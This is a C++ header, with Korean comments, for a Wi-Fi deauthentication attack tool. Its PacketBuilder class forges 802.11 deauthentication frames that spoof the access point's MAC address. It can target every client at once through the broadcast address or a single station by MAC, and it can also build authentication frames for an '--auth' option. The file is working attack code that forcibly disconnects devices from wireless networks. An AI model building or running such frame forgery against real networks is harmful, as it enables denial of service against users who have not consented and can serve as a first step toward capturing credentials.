#pragma once
#include <cstdint>
#include <cstring>
#include <cstdio>
#include "deauth.h"

class PacketBuilder {
public:
    // 패킷을 초기화하는 함수
    static void init_packet(struct Packet *packet, char *ap_mac) {
        memset(packet, 0, sizeof(struct Packet));
        packet->radiotap.it_len = 0x0018;
        packet->deauth.type = 0xc0;
        packet->deauth.duration = 0x3c;
        macStringToUint8(ap_mac, packet->deauth.source_address);
        macStringToUint8(ap_mac, packet->deauth.bssid);
        packet->fixed.reason_code = 0x06;
    }

    static void ap_broadcast_frame(struct Packet *packet) {
        memset(packet->deauth.destination_address, 0xFF, 6);
    }

    // 특정 Station에게 연결을 끊으라는 프레임을 생성하는 함수
    static void ap_unicast_frame(struct Packet *packet, char *station_mac) {
        macStringToUint8(station_mac, packet->deauth.destination_address);
    }

    // --auth 옵션이 있는 경우 교환을 초기화하기 위해 Auth 패킷을 생성하는 함수
    static void auth_init(struct AuthPacket *auth_packet, char *ap_mac, char *station_mac) {
        memset(auth_packet, 0, sizeof(struct AuthPacket));
        auth_packet->radiotap.it_len = 0x0018;
        auth_packet->auth.type = 0xb0;

        macStringToUint8(station_mac, auth_packet->auth.source_address);
        macStringToUint8(ap_mac, auth_packet->auth.destination_address);
        macStringToUint8(ap_mac, auth_packet->auth.bssid);

        auth_packet->AuthParameter.SEQ = 1;
    }

private:
    // MAC 주소를 uint8_t 배열로 변환하는 함수
    static void macStringToUint8(char *mac_string, uint8_t *ap_mac) {
        sscanf(mac_string, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
               &ap_mac[0], &ap_mac[1], &ap_mac[2],
               &ap_mac[3], &ap_mac[4], &ap_mac[5]);
    }
};
